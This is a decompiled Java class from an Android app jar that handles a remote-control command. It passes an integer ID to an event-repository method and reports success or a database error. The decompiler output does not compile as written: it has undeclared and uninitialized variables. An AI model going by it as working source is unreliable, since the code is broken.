package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.eventrepository.c;
import com.vvt.exceptions.database.FxDatabaseException;
import com.vvt.exceptions.database.FxDbIdNotFoundException;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class d
{
  private static final boolean a = a.a;
  private RmtCtrlOutputStatusMessage b;
  
  public RmtCtrlOutputStatusMessage a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    Object localObject1 = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject1).<init>();
    this.b = ((RmtCtrlOutputStatusMessage)localObject1);
    localObject1 = paramControlCommand.getData();
    bool1 = localObject1 instanceof Integer;
    int i;
    if (bool1)
    {
      localObject1 = (Integer)localObject1;
      i = ((Integer)localObject1).intValue();
      bool1 = a;
      if (!bool1) {}
    }
    try
    {
      localObject2 = paramh.j;
      long l = i;
      ((c)localObject2).c(l);
      localObject1 = this.b;
      bool1 = true;
      ((RmtCtrlOutputStatusMessage)localObject1).setSuccess(bool1);
      localObject1 = this.b;
      localObject2 = "";
      ((RmtCtrlOutputStatusMessage)localObject1).setMessage((String)localObject2);
      boolean bool2 = a;
      if (!bool2) {}
    }
    catch (FxDatabaseException localFxDatabaseException)
    {
      for (;;)
      {
        bool1 = a;
        if (bool1) {}
        Object localObject2 = this.b;
        ((RmtCtrlOutputStatusMessage)localObject2).setSuccess(false);
        bool1 = localFxDatabaseException instanceof FxDbIdNotFoundException;
        String str;
        if (bool1)
        {
          localObject2 = this.b;
          str = ((FxDbIdNotFoundException)localFxDatabaseException).getMessage();
          ((RmtCtrlOutputStatusMessage)localObject2).setMessage(str);
        }
        else
        {
          localObject2 = this.b;
          str = str.getMessage();
          ((RmtCtrlOutputStatusMessage)localObject2).setMessage(str);
        }
      }
    }
    return this.b;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */